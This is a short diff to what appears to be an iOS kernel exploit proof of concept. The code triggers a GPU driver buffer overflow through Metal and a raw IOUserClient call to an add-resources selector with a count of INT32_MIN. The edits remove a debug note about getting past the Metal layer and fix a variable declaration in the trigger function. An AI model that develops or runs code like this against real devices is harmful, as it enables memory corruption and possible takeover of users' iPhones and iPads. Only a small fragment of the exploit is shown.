@@ -223,8 +223,6 @@ static void trigger_bof(id<MTLDevice> dev) {
         [cb commit];
 
         evf("encoder path completed (kernel state intact)");
-        evf("NOTE: overflow_count=%#llx needs raw IOUserClient to bypass Metal layer",
-            (unsigned long long)OVERFLOW_COUNT);
     } else {
         evf("MTLResidencySet unavailable (iOS < 17.0)");
     }
@@ -347,7 +345,7 @@ static void trigger_bof_iokit(void) {
     evf("Sending selector 0x%x with count=0x%x (INT32_MIN)",
         GPU_SELECTOR_ADD_RESOURCES, cs.count);
 
-    kr = IOConnectCallMethod(conn,
+    kern_return_t kr = IOConnectCallMethod(conn,
                              GPU_SELECTOR_ADD_RESOURCES,
                              scalar_in, 0,
                              &args, sizeof(args),
